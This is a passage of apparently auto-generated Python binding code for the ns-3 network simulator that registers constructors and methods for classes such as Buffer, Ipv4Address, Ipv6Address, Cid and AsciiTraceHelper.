[param('uint8_t *', 'buffer'), param('uint8_t', 'len')],
is_const=True)
cls.add_method('CopyFrom',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint8_t', 'len')])
cls.add_method('CopyTo',
'uint32_t',
[param('uint8_t *', 'buffer')],
is_const=True)
cls.add_method('Deserialize',
'void',
[param('ns3::TagBuffer', 'buffer')])
cls.add_method('GetLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('IsInvalid',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('uint8_t', 'type')],
is_const=True)
cls.add_method('Register',
'uint8_t',
[],
is_static=True)
cls.add_method('Serialize',
'void',
[param('ns3::TagBuffer', 'buffer')],
is_const=True)
return
def register_Ns3AsciiTraceHelper_methods(root_module, cls):
cls.add_constructor([param('ns3::AsciiTraceHelper const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateFileStream',
'ns3::Ptr< ns3::OutputStreamWrapper >',
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode', default_value='std::ios_base::out')])
cls.add_method('DefaultDequeueSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultDequeueSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultDropSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultDropSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultEnqueueSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultEnqueueSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultReceiveSinkWithContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('std::string', 'context'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('DefaultReceiveSinkWithoutContext',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'file'), param('ns3::Ptr< ns3::Packet const >', 'p')],
is_static=True)
cls.add_method('GetFilenameFromDevice',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])
cls.add_method('GetFilenameFromInterfacePair',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])
return
def register_Ns3AsciiTraceHelperForDevice_methods(root_module, cls):
cls.add_constructor([param('ns3::AsciiTraceHelperForDevice const &', 'arg0')])
cls.add_constructor([])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::Ptr< ns3::NetDevice >', 'nd')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'ndName')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NetDeviceContainer', 'd')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('ns3::NodeContainer', 'n')])
cls.add_method('EnableAscii',
'void',
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'explicitFilename')])
cls.add_method('EnableAscii',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid')])
cls.add_method('EnableAsciiAll',
'void',
[param('std::string', 'prefix')])
cls.add_method('EnableAsciiAll',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream')])
cls.add_method('EnableAsciiInternal',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],
is_pure_virtual=True, is_virtual=True)
return
def register_Ns3AttributeConstructionList_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeConstructionList const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('std::string', 'name'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker'), param('ns3::Ptr< ns3::AttributeValue >', 'value')])
cls.add_method('Begin',
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',
[],
is_const=True)
cls.add_method('End',
'std::_List_const_iterator< ns3::AttributeConstructionList::Item >',
[],
is_const=True)
cls.add_method('Find',
'ns3::Ptr< ns3::AttributeValue >',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True)
return
def register_Ns3AttributeConstructionListItem_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::AttributeConstructionList::Item const &', 'arg0')])
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)
cls.add_instance_attribute('name', 'std::string', is_const=False)
cls.add_instance_attribute('value', 'ns3::Ptr< ns3::AttributeValue >', is_const=False)
return
def register_Ns3Buffer_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'dataSize')])
cls.add_constructor([param('uint32_t', 'dataSize'), param('bool', 'initialize')])
cls.add_constructor([param('ns3::Buffer const &', 'o')])
cls.add_method('AddAtEnd',
'bool',
[param('uint32_t', 'end')])
cls.add_method('AddAtEnd',
'void',
[param('ns3::Buffer const &', 'o')])
cls.add_method('AddAtStart',
'bool',
[param('uint32_t', 'start')])
cls.add_method('Begin',
'ns3::Buffer::Iterator',
[],
is_const=True)
cls.add_method('CopyData',
'void',
[param('std::ostream *', 'os'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CopyData',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CreateFragment',
'ns3::Buffer',
[param('uint32_t', 'start'), param('uint32_t', 'length')],
is_const=True)
cls.add_method('CreateFullCopy',
'ns3::Buffer',
[],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('End',
'ns3::Buffer::Iterator',
[],
is_const=True)
cls.add_method('GetCurrentEndOffset',
'int32_t',
[],
is_const=True)
cls.add_method('GetCurrentStartOffset',
'int32_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('PeekData',
'uint8_t const *',
[],
is_const=True)
cls.add_method('RemoveAtEnd',
'void',
[param('uint32_t', 'end')])
cls.add_method('RemoveAtStart',
'void',
[param('uint32_t', 'start')])
cls.add_method('Serialize',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
return
def register_Ns3BufferIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::Buffer::Iterator const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CalculateIpChecksum',
'uint16_t',
[param('uint16_t', 'size')])
cls.add_method('CalculateIpChecksum',
'uint16_t',
[param('uint16_t', 'size'), param('uint32_t', 'initialChecksum')])
cls.add_method('GetDistanceFrom',
'uint32_t',
[param('ns3::Buffer::Iterator const &', 'o')],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('IsEnd',
'bool',
[],
is_const=True)
cls.add_method('IsStart',
'bool',
[],
is_const=True)
cls.add_method('Next',
'void',
[])
cls.add_method('Next',
'void',
[param('uint32_t', 'delta')])
cls.add_method('Prev',
'void',
[])
cls.add_method('Prev',
'void',
[param('uint32_t', 'delta')])
cls.add_method('Read',
'void',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('ReadLsbtohU16',
'uint16_t',
[])
cls.add_method('ReadLsbtohU32',
'uint32_t',
[])
cls.add_method('ReadLsbtohU64',
'uint64_t',
[])
cls.add_method('ReadNtohU16',
'uint16_t',
[])
cls.add_method('ReadNtohU32',
'uint32_t',
[])
cls.add_method('ReadNtohU64',
'uint64_t',
[])
cls.add_method('ReadU16',
'uint16_t',
[])
cls.add_method('ReadU32',
'uint32_t',
[])
cls.add_method('ReadU64',
'uint64_t',
[])
cls.add_method('ReadU8',
'uint8_t',
[])
cls.add_method('Write',
'void',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('Write',
'void',
[param('ns3::Buffer::Iterator', 'start'), param('ns3::Buffer::Iterator', 'end')])
cls.add_method('WriteHtolsbU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteHtolsbU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteHtolsbU64',
'void',
[param('uint64_t', 'data')])
cls.add_method('WriteHtonU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteHtonU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteHtonU64',
'void',
[param('uint64_t', 'data')])
cls.add_method('WriteU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteU64',
'void',
[param('uint64_t', 'data')])
cls.add_method('WriteU8',
'void',
[param('uint8_t', 'data')])
cls.add_method('WriteU8',
'void',
[param('uint8_t', 'data'), param('uint32_t', 'len')])
return
def register_Ns3ByteTagIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagIterator const &', 'arg0')])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::ByteTagIterator::Item',
[])
return
def register_Ns3ByteTagIteratorItem_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagIterator::Item const &', 'arg0')])
cls.add_method('GetEnd',
'uint32_t',
[],
is_const=True)
cls.add_method('GetStart',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTag',
'void',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_const=True)
return
def register_Ns3ByteTagList_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ByteTagList const &', 'o')])
cls.add_method('Add',
'ns3::TagBuffer',
[param('ns3::TypeId', 'tid'), param('uint32_t', 'bufferSize'), param('int32_t', 'start'), param('int32_t', 'end')])
cls.add_method('Add',
'void',
[param('ns3::ByteTagList const &', 'o')])
cls.add_method('AddAtEnd',
'void',
[param('int32_t', 'adjustment'), param('int32_t', 'appendOffset')])
cls.add_method('AddAtStart',
'void',
[param('int32_t', 'adjustment'), param('int32_t', 'prependOffset')])
cls.add_method('Begin',
'ns3::ByteTagList::Iterator',
[param('int32_t', 'offsetStart'), param('int32_t', 'offsetEnd')],
is_const=True)
cls.add_method('RemoveAll',
'void',
[])
return
def register_Ns3ByteTagListIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagList::Iterator const &', 'arg0')])
cls.add_method('GetOffsetStart',
'uint32_t',
[],
is_const=True)
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::ByteTagList::Iterator::Item',
[])
return
def register_Ns3ByteTagListIteratorItem_methods(root_module, cls):
cls.add_constructor([param('ns3::ByteTagList::Iterator::Item const &', 'arg0')])
cls.add_constructor([param('ns3::TagBuffer', 'buf')])
cls.add_instance_attribute('buf', 'ns3::TagBuffer', is_const=False)
cls.add_instance_attribute('end', 'int32_t', is_const=False)
cls.add_instance_attribute('size', 'uint32_t', is_const=False)
cls.add_instance_attribute('start', 'int32_t', is_const=False)
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)
return
def register_Ns3CallbackBase_methods(root_module, cls):
cls.add_constructor([param('ns3::CallbackBase const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetImpl',
'ns3::Ptr< ns3::CallbackImplBase >',
[],
is_const=True)
cls.add_constructor([param('ns3::Ptr< ns3::CallbackImplBase >', 'impl')],
visibility='protected')
cls.add_method('Demangle',
'std::string',
[param('std::string const &', 'mangled')],
is_static=True, visibility='protected')
return
def register_Ns3Cid_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Cid const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint16_t', 'cid')])
cls.add_method('Broadcast',
'ns3::Cid',
[],
is_static=True)
cls.add_method('GetIdentifier',
'uint16_t',
[],
is_const=True)
cls.add_method('InitialRanging',
'ns3::Cid',
[],
is_static=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True)
cls.add_method('IsInitialRanging',
'bool',
[],
is_const=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsPadding',
'bool',
[],
is_const=True)
cls.add_method('Padding',
'ns3::Cid',
[],
is_static=True)
return
def register_Ns3CidFactory_methods(root_module, cls):
cls.add_constructor([param('ns3::CidFactory const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Allocate',
'ns3::Cid',
[param('ns3::Cid::Type', 'type')])
cls.add_method('AllocateBasic',
'ns3::Cid',
[])
cls.add_method('AllocateMulticast',
'ns3::Cid',
[])
cls.add_method('AllocatePrimary',
'ns3::Cid',
[])
cls.add_method('AllocateTransportOrSecondary',
'ns3::Cid',
[])
cls.add_method('FreeCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('IsBasic',
'bool',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('IsPrimary',
'bool',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('IsTransport',
'bool',
[param('ns3::Cid', 'cid')],
is_const=True)
return
def register_Ns3CsParameters_methods(root_module, cls):
cls.add_constructor([param('ns3::CsParameters const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Tlv', 'tlv')])
cls.add_constructor([param('ns3::CsParameters::Action', 'classifierDscAction'), param('ns3::IpcsClassifierRecord', 'classifier')])
cls.add_method('GetClassifierDscAction',
'ns3::CsParameters::Action',
[],
is_const=True)
cls.add_method('GetPacketClassifierRule',
'ns3::IpcsClassifierRecord',
[],
is_const=True)
cls.add_method('SetClassifierDscAction',
'void',
[param('ns3::CsParameters::Action', 'action')])
cls.add_method('SetPacketClassifierRule',
'void',
[param('ns3::IpcsClassifierRecord', 'packetClassifierRule')])
cls.add_method('ToTlv',
'ns3::Tlv',
[],
is_const=True)
return
def register_Ns3DcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::DcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBsEirp',
'uint16_t',
[],
is_const=True)
cls.add_method('GetEirxPIrMax',
'uint16_t',
[],
is_const=True)
cls.add_method('GetFrequency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetBsEirp',
'void',
[param('uint16_t', 'bs_eirp')])
cls.add_method('SetEirxPIrMax',
'void',
[param('uint16_t', 'rss_ir_max')])
cls.add_method('SetFrequency',
'void',
[param('uint32_t', 'frequency')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3DlFramePrefixIe_methods(root_module, cls):
cls.add_constructor([param('ns3::DlFramePrefixIe const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLength',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPreamblePresent',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRateId',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetStartTime',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetDiuc',
'void',
[param('uint8_t', 'diuc')])
cls.add_method('SetLength',
'void',
[param('uint16_t', 'length')])
cls.add_method('SetPreamblePresent',
'void',
[param('uint8_t', 'preamblePresent')])
cls.add_method('SetRateId',
'void',
[param('uint8_t', 'rateId')])
cls.add_method('SetStartTime',
'void',
[param('uint16_t', 'startTime')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3EventId_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::EventId const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::EventImpl > const &', 'impl'), param('uint64_t', 'ts'), param('uint32_t', 'context'), param('uint32_t', 'uid')])
cls.add_method('Cancel',
'void',
[])
cls.add_method('GetContext',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTs',
'uint64_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint32_t',
[],
is_const=True)
cls.add_method('IsExpired',
'bool',
[],
is_const=True)
cls.add_method('IsRunning',
'bool',
[],
is_const=True)
cls.add_method('PeekEventImpl',
'ns3::EventImpl *',
[],
is_const=True)
return
def register_Ns3IpcsClassifierRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::IpcsClassifierRecord const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask'), param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask'), param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh'), param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh'), param('uint8_t', 'protocol'), param('uint8_t', 'priority')])
cls.add_constructor([param('ns3::Tlv', 'tlv')])
cls.add_method('AddDstAddr',
'void',
[param('ns3::Ipv4Address', 'dstAddress'), param('ns3::Ipv4Mask', 'dstMask')])
cls.add_method('AddDstPortRange',
'void',
[param('uint16_t', 'dstPortLow'), param('uint16_t', 'dstPortHigh')])
cls.add_method('AddProtocol',
'void',
[param('uint8_t', 'proto')])
cls.add_method('AddSrcAddr',
'void',
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Mask', 'srcMask')])
cls.add_method('AddSrcPortRange',
'void',
[param('uint16_t', 'srcPortLow'), param('uint16_t', 'srcPortHigh')])
cls.add_method('CheckMatch',
'bool',
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],
is_const=True)
cls.add_method('GetCid',
'uint16_t',
[],
is_const=True)
cls.add_method('GetIndex',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPriority',
'uint8_t',
[],
is_const=True)
cls.add_method('SetCid',
'void',
[param('uint16_t', 'cid')])
cls.add_method('SetIndex',
'void',
[param('uint16_t', 'index')])
cls.add_method('SetPriority',
'void',
[param('uint8_t', 'prio')])
cls.add_method('ToTlv',
'ns3::Tlv',
[],
is_const=True)
return
def register_Ns3Ipv4Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Ipv4Address const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'address')])
cls.add_constructor([param('char const *', 'address')])
cls.add_method('CombineMask',
'ns3::Ipv4Address',
[param('ns3::Ipv4Mask const &', 'mask')],
is_const=True)
cls.add_method('ConvertFrom',
'ns3::Ipv4Address',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('Deserialize',
'ns3::Ipv4Address',
[param('uint8_t const *', 'buf')],
is_static=True)
cls.add_method('Get',
'uint32_t',
[],
is_const=True)
cls.add_method('GetAny',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('GetBroadcast',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('GetLoopback',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('GetSubnetDirectedBroadcast',
'ns3::Ipv4Address',
[param('ns3::Ipv4Mask const &', 'mask')],
is_const=True)
cls.add_method('GetZero',
'ns3::Ipv4Address',
[],
is_static=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv4Address const &', 'other')],
is_const=True)
cls.add_method('IsLocalMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsSubnetDirectedBroadcast',
'bool',
[param('ns3::Ipv4Mask const &', 'mask')],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('Serialize',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('Set',
'void',
[param('uint32_t', 'address')])
cls.add_method('Set',
'void',
[param('char const *', 'address')])
return
def register_Ns3Ipv4Mask_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Ipv4Mask const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'mask')])
cls.add_constructor([param('char const *', 'mask')])
cls.add_method('Get',
'uint32_t',
[],
is_const=True)
cls.add_method('GetInverse',
'uint32_t',
[],
is_const=True)
cls.add_method('GetLoopback',
'ns3::Ipv4Mask',
[],
is_static=True)
cls.add_method('GetOnes',
'ns3::Ipv4Mask',
[],
is_static=True)
cls.add_method('GetPrefixLength',
'uint16_t',
[],
is_const=True)
cls.add_method('GetZero',
'ns3::Ipv4Mask',
[],
is_static=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv4Mask', 'other')],
is_const=True)
cls.add_method('IsMatch',
'bool',
[param('ns3::Ipv4Address', 'a'), param('ns3::Ipv4Address', 'b')],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('Set',
'void',
[param('uint32_t', 'mask')])
return
def register_Ns3Ipv6Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([])
cls.add_constructor([param('char const *', 'address')])
cls.add_constructor([param('uint8_t *', 'address')])
cls.add_constructor([param('ns3::Ipv6Address const &', 'addr')])
cls.add_constructor([param('ns3::Ipv6Address const *', 'addr')])
cls.add_method('CombinePrefix',
'ns3::Ipv6Address',
[param('ns3::Ipv6Prefix const &', 'prefix')])
cls.add_method('ConvertFrom',
'ns3::Ipv6Address',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('Deserialize',
'ns3::Ipv6Address',
[param('uint8_t const *', 'buf')],
is_static=True)
cls.add_method('GetAllHostsMulticast',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetAllNodesMulticast',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetAllRoutersMulticast',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetAny',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetBytes',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('GetLoopback',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetOnes',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('GetZero',
'ns3::Ipv6Address',
[],
is_static=True)
cls.add_method('IsAllHostsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsAllNodesMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsAllRoutersMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsAny',
'bool',
[],
is_const=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv6Address const &', 'other')],
is_const=True)
cls.add_method('IsLinkLocal',
'bool',
[],
is_const=True)
cls.add_method('IsLocalhost',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True)
cls.add_method('IsSolicitedMulticast',
'bool',
[],
is_const=True)
cls.add_method('MakeAutoconfiguredAddress',
'ns3::Ipv6Address',
[param('ns3::Mac48Address', 'addr'), param('ns3::Ipv6Address', 'prefix')],
is_static=True)
cls.add_method('MakeAutoconfiguredLinkLocalAddress',
'ns3::Ipv6Address',
[param('ns3::Mac48Address', 'mac')],
is_static=True)
cls.add_method('MakeSolicitedAddress',
'ns3::Ipv6Address',
[param('ns3::Ipv6Address', 'addr')],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('Serialize',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('Set',
'void',
[param('char const *', 'address')])
cls.add_method('Set',
'void',
[param('uint8_t *', 'address')])
return
def register_Ns3Ipv6Prefix_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([])
cls.add_constructor([param('uint8_t *', 'prefix')])
cls.add_constructor([param('char const *', 'prefix')])
cls.add_constructor([param('uint8_t', 'prefix')])
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'prefix')])
cls.add_constructor([param('ns3::Ipv6Prefix const *', 'prefix')])
cls.add_method('GetBytes',
'void',
[param('uint8_t *', 'buf')],
is_const=True)
cls.add_method('GetLoopback',
'ns3::Ipv6Prefix',
[],
is_static=True)
cls.add_method('GetOnes',
'ns3::Ipv6Prefix',
[],
is_static=True)
cls.add_method('GetPrefixLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetZero',
'ns3::Ipv6Prefix',
[],
is_static=True)
cls.add_method('IsEqual',
'bool',
[param('ns3::Ipv6Prefix const &', 'other')],
is_const=True)
cls.add_method('IsMatch',
'bool',
[param('ns3::Ipv6Address', 'a'), param('ns3::Ipv6Address', 'b')],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
return
def register_Ns3LogComponent_methods(root_module, cls):
cls.add_constructor([param('ns3::LogComponent const &', 'arg0')])
cls.add_constructor([param('char const *', 'name')])
cls.add_method('Disable',
'void',
[param('ns3::LogLevel', 'level')])
cls.add_method('Enable',
'void',
[param('ns3::LogLevel', 'level')])
cls.add_method('EnvVarCheck',
'void',
[param('char const *', 'name')])
cls.add_method('IsEnabled',
'bool',
[param('ns3::LogLevel', 'level')],
is_const=True)
cls.add_method('IsNoneEnabled',
'bool',
[],
is_const=True)
cls.add_method('Name',
'char const *',
[],
is_const=True)
return
def register_Ns3Mac48Address_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::Mac48Address const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('char const *', 'str')])
cls.add_method('Allocate',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('ConvertFrom',
'ns3::Mac48Address',
[param('ns3::Address const &', 'address')],
is_static=True)
cls.add_method('CopyFrom',
'void',
[param('uint8_t const *', 'buffer')])
cls.add_method('CopyTo',
'void',
[param('uint8_t *', 'buffer')],
is_const=True)
cls.add_method('GetBroadcast',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('GetMulticast',
'ns3::Mac48Address',
[param('ns3::Ipv4Address', 'address')],
is_static=True)
cls.add_method('GetMulticast',
'ns3::Mac48Address',
[param('ns3::Ipv6Address', 'address')],
is_static=True)
cls.add_method('GetMulticast6Prefix',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('GetMulticastPrefix',
'ns3::Mac48Address',
[],
is_static=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True)
cls.add_method('IsGroup',
'bool',
[],
is_const=True)
cls.add_method('IsMatchingType',
'bool',
[param('ns3::Address const &', 'address')],
is_static=True)
return
def register_Ns3NetDeviceContainer_methods(root_module, cls):
cls.add_constructor([param('ns3::NetDeviceContainer const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::NetDevice >', 'dev')])
cls.add_constructor([param('std::string', 'devName')])
